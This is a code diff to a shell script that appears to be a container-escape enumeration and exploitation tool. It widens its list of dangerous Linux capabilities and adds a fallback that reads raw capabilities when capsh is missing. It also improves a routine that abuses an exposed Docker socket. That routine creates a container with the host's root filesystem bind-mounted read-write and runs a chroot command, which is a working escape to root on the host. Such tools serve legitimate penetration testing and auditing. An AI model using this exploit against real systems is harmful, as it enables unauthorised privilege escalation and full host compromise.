@@ -129,7 +129,7 @@ TIP_CVE_2019_5736="Docker versions before 18.09.2 are vulnerable to a container 
 TIP_SYS_MODULE="Giving the container the SYS_MODULE privilege allows for kernel modules to be mounted. Using this, a malicious module can be used to execute code as root on the host."
 
 DANGEROUS_GROUPS="docker\|lxd\|root\|sudo\|wheel"
-DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override"
+DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override\|cap_sys_rawio\|cap_mknod"
 
 CONTAINER_CMDS="docker lxc rkt kubectl podman"
 USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap"
@@ -561,7 +561,13 @@ containerCapabilities() {
         printNo
     fi
   else
-    printError "Unknown (capsh not installed)"
+    caps=$(grep Cap /proc/self/status)
+    capEff=$(grep CapEff /proc/self/status | cut -d ':' -f 2 | tr -d '\t')
+    printError "capsh not installed, listing raw capabilities"
+    printInstallAdvice "libcap2-bin"
+    printStatus "Current capabilities are:"
+    printStatus "$caps"
+    printStatus "> This can be decoded with: \"capsh --decode=${capEff}\""
   fi
 }
 
@@ -1046,9 +1052,18 @@ exploitDockerSock() {
 
   nl
 
+  # Try to find an available docker image
+  json_data=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json)
+  docker_img=$(echo "$json_data" | grep -o '"RepoTags":\["[^"]*' | grep -o '[^"]*$' | tail -1)
+
+  if [ -z "$docker_img" ]; then
+    printInfo 'No avaliable docker image found, using alpine'
+    docker_img="alpine" 
+  fi 
+
   # Create docker container using the docker sock
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
-  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
+  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"$docker_img\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
   if ! [ $? ]; then
     printError 'Something went wrong'
